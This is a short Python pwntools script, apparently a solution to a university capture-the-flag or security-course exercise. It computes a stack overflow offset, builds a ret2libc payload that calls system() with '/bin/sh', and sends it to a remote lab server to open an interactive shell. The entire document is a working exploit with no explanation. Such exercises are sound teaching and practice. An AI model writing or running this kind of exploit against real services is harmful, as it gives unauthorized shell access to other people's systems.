from pwn import *

elf = ELF("./bin")

localBuffer = 0xffffcd40
eip = 0xffffcd8c
offset = eip - localBuffer

addrsSystem = elf.symbols["system"]
addrsBinSh = next(elf.search("/bin/sh"))

print("addrsSystem: ", hex(addrsSystem))
print("addrsBinSh: ", hex(addrsBinSh))

#P = process("./bin")
P = remote( "mustard.stt.rnl.tecnico.ulisboa.pt", 10102)
P.sendline(b"A"*offset + p32(addrsSystem) + b"BBBB" + p32(addrsBinSh))
P.interactive()